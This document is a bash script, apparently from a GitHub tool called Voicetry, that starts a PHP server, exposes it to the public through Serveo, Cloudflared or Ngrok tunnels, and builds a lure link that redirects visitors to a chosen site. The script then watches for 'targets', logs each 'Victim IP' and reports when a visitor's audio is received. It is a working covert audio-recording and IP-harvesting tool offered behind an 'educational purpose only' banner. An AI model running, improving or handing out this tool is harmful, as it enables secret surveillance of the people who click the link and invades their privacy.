#!/bin/bash
# Voicetry v1.0
# coded by: github.com/Zeeshan-78/Voicetry

__version__="1.0"
HOST='127.0.0.1'
PORT=''
redirect_link=''

RED="$(printf '\033[31m')"  GREEN="$(printf '\033[32m')"  ORANGE="$(printf '\033[33m')"
BLUE="$(printf '\033[34m')"  CYAN="$(printf '\033[36m')"  WHITE="$(printf '\033[37m')"
RESETBG="$(printf '\e[0m\n')"

BASE_DIR=$(realpath "$(dirname "$BASH_SOURCE")")
trap 'printf "\n"; stop' 2

clear

## ════════════════════════════════
## ── Detect Environment
## ════════════════════════════════
detect_env() {
    if command -v termux-info > /dev/null 2>&1 || [[ -d "/data/data/com.termux" ]]; then
        ENV_TYPE="termux"
        LOG_DIR="$BASE_DIR"
    elif command -v apt > /dev/null 2>&1; then
        ENV_TYPE="linux_apt"
        LOG_DIR="/tmp"
    elif command -v yum > /dev/null 2>&1; then
        ENV_TYPE="linux_yum"
        LOG_DIR="/tmp"
    else
        ENV_TYPE="unknown"
        LOG_DIR="$BASE_DIR"
    fi
}

banner() {
    echo -e "${GREEN}  __     __    _           _____                "
    echo -e "${GREEN}  \ \   / /__ (_) ___ ___|_   _| __ _   _      "
    echo -e "${GREEN}   \ \ / / _ \| |/ __/ _ \ | || '__| | | |     "
    echo -e "${GREEN}    \ V / (_) | | (_|  __/ | || |  | |_| |     "
    echo -e "${GREEN}     \_/ \___/|_|\___\___| |_||_|   \__, |     "
    echo -e "${GREEN}                                     |___/      "
    echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "  ${RED}Version    : ${CYAN}${__version__}"
    echo -e "  ${RED}Author     : ${CYAN}Zeeshan-Ali"
    echo -e "  ${RED}Supported  : ${CYAN}Linux, Termux"
    echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "  ${CYAN}NOTE: This tool is for educational purpose only."
    echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RESETBG}"
}

stop() {
    pkill -f cloudflared > /dev/null 2>&1
    pkill -f ngrok       > /dev/null 2>&1
    killall cloudflared  > /dev/null 2>&1
    killall ngrok        > /dev/null 2>&1
    killall php          > /dev/null 2>&1
    killall ssh          > /dev/null 2>&1
    echo -e "\n${RED}[!] Stopped.${WHITE}"
    exit 1
}

## ════════════════════════════════
## ── Port Utilities
## ════════════════════════════════
is_port_free() {
    local p=$1
    if command -v lsof > /dev/null 2>&1; then
        lsof -i tcp:${p} > /dev/null 2>&1 && return 1 || return 0
    elif command -v ss > /dev/null 2>&1; then
        ss -ln 2>/dev/null | grep -qE ":${p}\s" && return 1 || return 0
    elif command -v netstat > /dev/null 2>&1; then
        netstat -ln 2>/dev/null | grep -qE ":${p}\s" && return 1 || return 0
    else
        nc -z 127.0.0.1 ${p} > /dev/null 2>&1 && return 1 || return 0
    fi
}

find_free_port() {
    local p attempts=0
    while true; do
        p=$(( ( RANDOM % 7000 ) + 2000 ))
        attempts=$((attempts+1))
        if is_port_free $p; then
            echo $p
            return 0
        fi
        if [[ $attempts -ge 100 ]]; then
            echo 8080
            return 0
        fi
    done
}

kill_port() {
    local p=$1
    if command -v fuser > /dev/null 2>&1; then
        fuser -k ${p}/tcp > /dev/null 2>&1
    fi
    if command -v lsof > /dev/null 2>&1; then
        local pid
        pid=$(lsof -ti tcp:${p} 2>/dev/null)
        [[ -n "$pid" ]] && kill -9 $pid > /dev/null 2>&1
    fi
    sleep 1
}

choose_port() {
    local AUTO_PORT
    AUTO_PORT=$(find_free_port)
    echo
    read -p "${RED}[?]${ORANGE} Port? (Enter = auto: ${CYAN}${AUTO_PORT}${ORANGE}): ${WHITE}" USER_PORT

    if [[ -z "$USER_PORT" ]]; then
        PORT=$AUTO_PORT
        echo -e "${GREEN}[+] Auto port: ${CYAN}${PORT}${WHITE}"
    elif [[ "$USER_PORT" =~ ^[0-9]+$ ]] && \
         [[ "$USER_PORT" -ge 1024 ]] && \
         [[ "$USER_PORT" -le 65535 ]]; then
        if is_port_free "$USER_PORT"; then
            PORT=$USER_PORT
            echo -e "${GREEN}[+] Port: ${CYAN}${PORT}${WHITE}"
        else
            echo -e "${ORANGE}[!] Port $USER_PORT busy — auto: ${CYAN}${AUTO_PORT}${WHITE}"
            PORT=$AUTO_PORT
        fi
    else
        echo -e "${ORANGE}[!] Invalid — auto: ${CYAN}${AUTO_PORT}${WHITE}"
        PORT=$AUTO_PORT
    fi
}

## ════════════════════════════════
## ── Dependencies
## ════════════════════════════════
install_pkg() {
    local pkg=$1
    echo -e "${ORANGE}[*] Installing $pkg...${WHITE}"
    if [[ "$ENV_TYPE" == "termux" ]]; then
        pkg install "$pkg" -y
    elif [[ "$ENV_TYPE" == "linux_apt" ]]; then
        sudo apt install "$pkg" -y
    elif [[ "$ENV_TYPE" == "linux_yum" ]]; then
        sudo yum install "$pkg" -y
    else
        echo -e "${RED}[!] Manually install karo: $pkg${WHITE}"; exit 1
    fi
}

dependencies() {
    if ! command -v php > /dev/null 2>&1; then
        echo -e "${RED}[!] PHP nahi mila. Install kar raha hoon...${WHITE}"
        install_pkg php
        command -v php > /dev/null 2>&1 || {
            echo -e "${RED}[!] PHP install fail.${WHITE}"
            [[ "$ENV_TYPE" == "termux" ]] && echo "  pkg install php" || echo "  sudo apt install php"
            exit 1
        }
    fi
    command -v curl > /dev/null 2>&1 || install_pkg curl
    command -v ssh  > /dev/null 2>&1 || {
        [[ "$ENV_TYPE" == "termux" ]] && install_pkg openssh || install_pkg openssh-client
    }
    command -v unzip > /dev/null 2>&1 || install_pkg unzip
    echo -e "${GREEN}[+] Dependencies OK.${WHITE}"
}

download() {
    curl --progress-bar --create-dirs -L "$1" -o ".server/$2"
}

## ════════════════════════════════
## ── FIX 1: PHP Server
## PHP "started" message = server ready
## is_port_free unreliable tha — ab
## grep se "started" message check karo
## ════════════════════════════════
start_php() {
    echo -e "${RED}[-]${GREEN} PHP server start kar raha hoon port ${PORT} par..."

    kill_port "$PORT"
    cd "$BASE_DIR"

    local PHP_LOG="${LOG_DIR}/.php_err.log"
    rm -f "$PHP_LOG"

    php -S "${HOST}:${PORT}" > "$PHP_LOG" 2>&1 &
    local PHP_PID=$!

    # FIX: "started" word aane tak wait karo — max 8 seconds
    local i started=0
    for i in 1 2 3 4 5 6 7 8; do
        sleep 1
        # PHP apna "started" message log mein likhta hai
        if grep -q "started" "$PHP_LOG" 2>/dev/null; then
            started=1
            break
        fi
        # Process bhi alive honi chahiye
        if ! kill -0 "$PHP_PID" 2>/dev/null; then
            break
        fi
    done

    if [[ $started -eq 1 ]]; then
        echo -e "${GREEN}[+] PHP ready (PID: ${PHP_PID}) — ${HOST}:${PORT}${WHITE}"
    else
        echo -e "${RED}[!] PHP start nahi hua. Error:${WHITE}"
        cat "$PHP_LOG" 2>/dev/null
        # Naya port try karo automatically
        echo -e "${ORANGE}[*] Naya port try kar raha hoon...${WHITE}"
        PORT=$(find_free_port)
        echo -e "${GREEN}[*] Naya port: ${PORT}${WHITE}"
        kill_port "$PORT"
        rm -f "$PHP_LOG"
        php -S "${HOST}:${PORT}" > "$PHP_LOG" 2>&1 &
        PHP_PID=$!
        local j
        for j in 1 2 3 4 5 6 7 8; do
            sleep 1
            if grep -q "started" "$PHP_LOG" 2>/dev/null; then
                started=1
                break
            fi
        done
        if [[ $started -eq 1 ]]; then
            echo -e "${GREEN}[+] PHP ready (PID: ${PHP_PID}) — ${HOST}:${PORT}${WHITE}"
        else
            echo -e "${RED}[!] PHP bilkul start nahi ho raha:${WHITE}"
            cat "$PHP_LOG" 2>/dev/null
            exit 1
        fi
    fi
}

## ════════════════════════════════
## ── NGROK
## ════════════════════════════════
install_ngrok() {
    mkdir -p .server
    if [[ -e ".server/ngrok" && -x ".server/ngrok" ]]; then
        echo -e "\n${GREEN}[+] Ngrok already installed.${WHITE}"
        return
    fi
    echo -e "\n${GREEN}[+]${CYAN} Downloading Ngrok...${WHITE}"
    local arch
    arch=$(uname -m)
    if [[ "$arch" == *'aarch64'* ]]; then
        download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm64.tgz' 'ngrok.tgz'
    elif [[ "$arch" == *'arm'* ]]; then
        download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-arm.tgz' 'ngrok.tgz'
    elif [[ "$arch" == *'x86_64'* ]]; then
        download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz' 'ngrok.tgz'
    else
        download 'https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-386.tgz' 'ngrok.tgz'
    fi
    cd .server
    tar -xzf ngrok.tgz > /dev/null 2>&1
    rm -f ngrok.tgz
    chmod +x ngrok
    cd "$BASE_DIR"
    echo -e "${GREEN}[+] Ngrok ready.${WHITE}"
}

start_ngrok() {
    choose_port
    start_php

    local NGROK_BIN
    if command -v ngrok > /dev/null 2>&1; then
        NGROK_BIN="ngrok"
    elif [[ -x ".server/ngrok" ]]; then
        NGROK_BIN="./.server/ngrok"
    else
        echo -e "${RED}[!] Ngrok binary nahi mila!${WHITE}"; exit 1
    fi

    echo
    echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    echo -e "  ${ORANGE}Ngrok Authtoken chahiye."
    echo -e "  ${WHITE}Signup : ${BLUE}https://dashboard.ngrok.com/signup"
    echo -e "  ${WHITE}Token  : ${BLUE}https://dashboard.ngrok.com/get-started/your-authtoken"
    echo -e "${CYAN}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${WHITE}"
    echo
    read -p "${RED}[+]${GREEN} Authtoken daalein: ${BLUE}" ngrok_token

    if [[ -z "$ngrok_token" ]]; then
        echo -e "${RED}[!] Token khali hai!${WHITE}"; sleep 2; start1; return
    fi

    $NGROK_BIN config add-authtoken "$ngrok_token" > /dev/null 2>&1
    echo -e "${GREEN}[+] Authtoken saved.${WHITE}"

    pkill -f ngrok > /dev/null 2>&1; sleep 1

    local NGROK_LOG="${LOG_DIR}/.ngrok.log"
    rm -f "$NGROK_LOG"

    echo -e "\n${RED}[-]${GREEN} Ngrok tunnel launch — port ${PORT}..."
    $NGROK_BIN http "${PORT}" --log "$NGROK_LOG" --log-format json > /dev/null 2>&1 &

    echo -e "${RED}[*]${GREEN} URL wait kar raha hoon (max 30s)..."
    local count=0 ngrok_url=""
    while true; do
        sleep 2; count=$((count+2))
        # API se URL
        ngrok_url=$(curl -s --max-time 3 http://127.0.0.1:4040/api/tunnels 2>/dev/null \
            | grep -oE '"public_url":"https://[^"]+' \
            | grep -oE 'https://[^"]+' | head -n1)
        # Log se
        if [[ -z "$ngrok_url" && -e "$NGROK_LOG" ]]; then
            ngrok_url=$(grep -oE '"url":"https://[^"]+' "$NGROK_LOG" \
                | grep -oE 'https://[^"]+' | head -n1)
        fi
        [[ -n "$ngrok_url" ]] && break
        if [[ -e "$NGROK_LOG" ]] && \
           grep -qiE "ERR_NGROK_108|ERR_NGROK_302|invalid authtoken|authentication failed" "$NGROK_LOG" 2>/dev/null; then
            echo -e "\n${RED}[!] Ngrok token galat hai!"
            echo -e "    ${BLUE}https://dashboard.ngrok.com/get-started/your-authtoken${WHITE}"
            exit 1
        fi
        if [[ $count -ge 30 ]]; then
            echo -e "\n${RED}[!] Ngrok URL nahi mila."
            [[ -e "$NGROK_LOG" ]] && tail -5 "$NGROK_LOG"
            exit 1
        fi
    done

    echo "$ngrok_url" > sendlink
    custom_url "$ngrok_url"
}

## ════════════════════════════════
## ── CLOUDFLARED
## ════════════════════════════════
install_cloudflared() {
    mkdir -p .server
    if [[ -e ".server/cloudflared" && -x ".server/cloudflared" ]]; then
        echo -e "\n${GREEN}[+] Cloudflared already installed.${WHITE}"
        return
    fi
    echo -e "\n${GREEN}[+]${CYAN} Downloading Cloudflared...${WHITE}"
    local arch
    arch=$(uname -m)
    if [[ "$arch" == *'aarch64'* ]]; then
        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64' 'cloudflared'
    elif [[ "$arch" == *'arm'* ]]; then
        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm' 'cloudflared'
    elif [[ "$arch" == *'x86_64'* ]]; then
        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64' 'cloudflared'
    else
        download 'https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386' 'cloudflared'
    fi
    chmod +x .server/cloudflared
    echo -e "${GREEN}[+] Cloudflared ready.${WHITE}"
}

start_cloudflared() {
    mkdir -p .server
    rm -f .server/.cld.log
    choose_port
    start_php

    pkill -f cloudflared > /dev/null 2>&1; sleep 1

    echo -e "\n${RED}[-]${GREEN} Cloudflared tunnel launch ho raha hai..."

    local CLD_CMD=()
    if command -v cloudflared > /dev/null 2>&1; then
        CLD_CMD=(cloudflared)
    elif [[ -x ".server/cloudflared" ]]; then
        if [[ "$ENV_TYPE" == "termux" ]] && command -v termux-chroot > /dev/null 2>&1; then
            CLD_CMD=(termux-chroot ./.server/cloudflared)
        else
            CLD_CMD=(./.server/cloudflared)
        fi
    else
        echo -e "${RED}[!] Cloudflared binary nahi mila!${WHITE}"; exit 1
    fi

    "${CLD_CMD[@]}" tunnel \
        --url "http://${HOST}:${PORT}" \
        --logfile .server/.cld.log \
        --no-autoupdate > /dev/null 2>&1 &

    echo -e "${RED}[*]${GREEN} URL wait kar raha hoon (max 60s)..."
    local count=0 cldflr_url=""
    while true; do
        sleep 2; count=$((count+2))
        if [[ -e ".server/.cld.log" ]]; then
            cldflr_url=$(grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' \
                ".server/.cld.log" | head -n1)
            if [[ -z "$cldflr_url" ]]; then
                cldflr_url=$(grep -oE '\|\s+https://[a-zA-Z0-9-]+\.trycloudflare\.com' \
                    ".server/.cld.log" \
                    | grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' | head -n1)
            fi
            if [[ -z "$cldflr_url" ]]; then
                cldflr_url=$(grep -A3 -i 'quick.*tunnel\|your tunnel\|tunnel.*url' \
                    ".server/.cld.log" \
                    | grep -oE 'https://[a-zA-Z0-9-]+\.trycloudflare\.com' | head -n1)
            fi
            [[ -n "$cldflr_url" ]] && break
        fi
        if [[ $count -ge 60 ]]; then
            echo -e "\n${RED}[!] Cloudflared URL nahi mila 60s mein."
            [[ -e ".server/.cld.log" ]] && tail -10 .server/.cld.log
            echo -e "${WHITE}"; exit 1
        fi
    done

    echo "$cldflr_url" > sendlink
    custom_url "$cldflr_url"
}

## ════════════════════════════════
## ── FIX 2: SERVEO
## console.serveo.net match ho raha tha
## Fix: sirf SUBDOMAIN.serveo.net match karo
## console. ya www. wala reject karo
## ════════════════════════════════
start_serveo() {
    local default_subdomain="voicetry$RANDOM"
    local subdomain_resp=false
    local subdomain=""

    read -p "${RED}[+]${GREEN} Subdomain chahiye? [Y/N]: " choose_sub
    choose_sub="${choose_sub:-Y}"
    if [[ $choose_sub =~ ^[yY] ]]; then
        subdomain_resp=true
        read -p "${RED}[+]${GREEN} Subdomain (Default: ${BLUE}${default_subdomain}${GREEN}): ${BLUE}" subdomain
        subdomain="${subdomain:-$default_subdomain}"
    fi

    choose_port
    start_php

    pkill -f "ssh.*serveo" > /dev/null 2>&1; sleep 1

    echo -e "\n${RED}[-]${GREEN} Serveo se connect ho raha hoon..."
    rm -f sendlink

    if [[ $subdomain_resp == true ]]; then
        ssh -o StrictHostKeyChecking=no \
            -o ServerAliveInterval=60 \
            -o ConnectTimeout=15 \
            -o ExitOnForwardFailure=yes \
            -R "${subdomain}:80:${HOST}:${PORT}" \
            serveo.net > sendlink 2>&1 &
    else
        ssh -o StrictHostKeyChecking=no \
            -o ServerAliveInterval=60 \
            -o ConnectTimeout=15 \
            -o ExitOnForwardFailure=yes \
            -R "80:${HOST}:${PORT}" \
            serveo.net > sendlink 2>&1 &
    fi

    echo -e "${RED}[*]${GREEN} Serveo URL wait kar raha hoon (max 30s)..."
    local count=0 send_link=""
    while true; do
        sleep 1; count=$((count+1))
        if [[ -e "sendlink" ]]; then
            # FIX: sirf actual tunnel URL lo
            # "Forwarding https://SUBDOMAIN.serveo.net" wali line
            # console.serveo.net, www.serveo.net ignore karo
            send_link=$(grep -oE 'https://[a-zA-Z0-9-]+\.serveo\.net' sendlink \
                | grep -vE 'console\.|www\.|dashboard\.' \
                | head -n1)
            [[ -n "$send_link" ]] && break

            # Error detect karo
            if grep -qE "Connection refused|Permission denied|Could not resolve|forwarding failed|bind.*failed" \
               sendlink 2>/dev/null; then
                echo -e "\n${RED}[!] Serveo failed:"
                cat sendlink
                echo -e "\n${ORANGE}[*] Cloudflared (2) ya Ngrok (3) try karo.${WHITE}"
                exit 1
            fi
        fi
        if [[ $count -ge 30 ]]; then
            echo -e "\n${RED}[!] Serveo URL nahi mila 30s mein."
            echo -e "${ORANGE}[*] Serveo down ho sakta hai — Cloudflared (2) ya Ngrok (3) try karo.${WHITE}"
            [[ -e "sendlink" ]] && echo -e "Log: $(cat sendlink)"
            exit 1
        fi
    done

    custom_url "$send_link"
}

## ════════════════════════════════
## ── Common
## ════════════════════════════════
custom_url() {
    local url=$1
    echo -e "\n${RED}[+]${GREEN} Link : ${BLUE}${url}${WHITE}"
    payload
    checkfound
}

payload() {
    if [[ ! -f "js/_app.js" ]]; then
        echo -e "${RED}[!] js/_app.js nahi mili!${WHITE}"; exit 1
    fi
    sed "s+redirect_link+${redirect_link}+g" js/_app.js > js/app.js
    echo -e "${GREEN}[+] js/app.js updated.${WHITE}"
}

catch_ip() {
    local ip
    ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    echo -e "\n${RED}[+]${GREEN} Victim IP: ${BLUE}${ip}${WHITE}"
    cat ip.txt >> saved.ip.txt
}

checkfound() {
    echo -e "\n${RED}[*]${GREEN} Waiting for targets... Ctrl+C to exit.\n${WHITE}"
    while true; do
        if [[ -e "ip.txt" ]]; then
            echo -e "${RED}[-]${GREEN} Target opened the link!"
            catch_ip
            rm -rf ip.txt
        fi
        sleep 0.5
        if [[ -e "Log.log" ]]; then
            echo -e "${RED}[-]${GREEN} Audio received!"
            rm -rf Log.log
        fi
        sleep 0.5
    done
}

check_update() {
    echo -ne "${GREEN}[+]${CYAN} Update check: "
    local new_version
    new_version=$(curl -s --max-time 5 \
        'https://api.github.com/repos/LxaNce-Hacker/Mohini/releases/latest' \
        | grep '"tag_name":' | awk -F\" '{print $4}')
    if [[ -n "$new_version" && "$new_version" != "$__version__" ]]; then
        echo -e "${ORANGE}Update available: $new_version${WHITE}"
    else
        echo -e "${GREEN}Up to date${WHITE}"
        sleep 1; clear; banner
    fi
}

check_status() {
    banner
    echo -ne "\n${GREEN}[+]${CYAN} Internet: "
    timeout 3s curl -fIs "https://api.github.com" > /dev/null
    if [[ $? -ne 0 ]]; then
        echo -e "${RED}Offline${WHITE}"
        local P_ANS
        read -n1 -p "${RED}[?]${ORANGE} Continue? [Y/N]: " P_ANS
        [[ ! ${P_ANS} =~ ^([yY])$ ]] && { echo -e "\n${BLUE}Bye!${WHITE}"; exit 1; }
        echo
    else
        echo -e "${GREEN}Online${WHITE}"
        check_update
    fi
}

start1() {
    [[ -e sendlink ]] && rm -rf sendlink
    printf "\n"
    echo -e "\n${RED}[01]${GREEN} Serveo.net"
    echo -e "${RED}[02]${GREEN} Cloudflared"
    echo -e "${RED}[03]${GREEN} Ngrok\n"

    local option_server
    read -p "${RED}[+]${ORANGE} Tunnel option chunein [1/2/3]: ${BLUE}" option_server
    option_server="${option_server:-1}"

    read -p "${RED}[+]${GREEN} Redirect URL (Default: ${BLUE}https://google.com${GREEN}): ${BLUE}" redirect_link
    redirect_link="${redirect_link:-https://google.com}"

    if [[ $option_server -eq 1 ]]; then
        start_serveo
    elif [[ $option_server -eq 2 ]]; then
        install_cloudflared
        start_cloudflared
    elif [[ $option_server -eq 3 ]]; then
        install_ngrok
        start_ngrok
    else
        echo -e "\n${RED}[!] Invalid!${WHITE}"
        sleep 1; clear; start1
    fi
}

## ── MAIN ──
detect_env
check_status
dependencies
start1
